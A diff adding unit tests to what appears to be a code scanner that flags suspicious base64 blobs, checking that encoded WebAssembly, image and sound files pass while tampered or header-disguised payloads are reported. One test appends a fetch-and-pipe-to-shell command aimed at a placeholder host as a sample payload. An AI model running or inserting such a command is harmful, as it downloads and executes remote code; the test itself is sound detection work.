@@ -14,7 +14,7 @@ import hashlib
 import unittest
 
 from lazaret.scanner import core
-from tests.registry._review_support import B64_DATA
+from tests.registry._review_support import B64_DATA, DATA_B64, DATA_FILES, FAKE_WASM_B64
 
 #: base64 of 240 bytes that do not repeat: 320 characters of every class
 DATA = B64_DATA
@@ -73,6 +73,33 @@ class PlainRunsTests(unittest.TestCase):
                          "a period broken at the end")
         self.assertEqual(len(b64('var s = "' + TABLE + "9" + '"\n')), 1, "letters and a digit")
         self.assertEqual(len(b64('var s = "0x' + "ab" * 110 + "g" + '"\n')), 1, "hex and a letter past f")
+
+
+class DataFormatTests(unittest.TestCase):
+    """N-4: the base64 of a whole file of a data format, read by its structure (the engine's datafmt.rs), is data:
+    undici's WebAssembly HTTP parser (in every action that bundles the Actions toolkit), es-module-lexer's, an image, a
+    sound were SC-B64. A payload with a format's header in front of it, or a file cut short or run on, is not."""
+
+    def test_whole_files_are_data(self):
+        for kind, run in DATA_B64.items():
+            with self.subTest(kind=kind):
+                self.assertGreaterEqual(len(run), 200)
+                self.assertEqual(b64("const blob = '" + run + "';\n", "js"), [])
+                self.assertEqual(b64('x = "' + run + '"\n', "py"), [])
+
+    def test_a_payload_behind_a_header_or_a_file_changed_is_reported(self):
+        import base64
+        self.assertEqual(b64("const w = '" + FAKE_WASM_B64 + "';\n", "js"), [1])
+        for kind, data in DATA_FILES.items():
+            for changed in (data[:-3], data + b"curl https://example.invalid/x | sh"):
+                with self.subTest(kind=kind, size=len(changed)):
+                    run = base64.b64encode(changed).decode()
+                    if kind == "wav" and len(changed) < len(data):
+                        continue                        # (a sound cut short in its last chunk is still one)
+                    self.assertEqual(b64("const w = '" + run + "';\n", "js"), [1])
+
+    def test_a_data_run_before_a_payload_on_the_line(self):
+        self.assertEqual(b64("const a = ['" + DATA_B64["wasm"] + "', '" + DATA + "'];\n", "js"), [1])
 
 
 class BoundTests(unittest.TestCase):
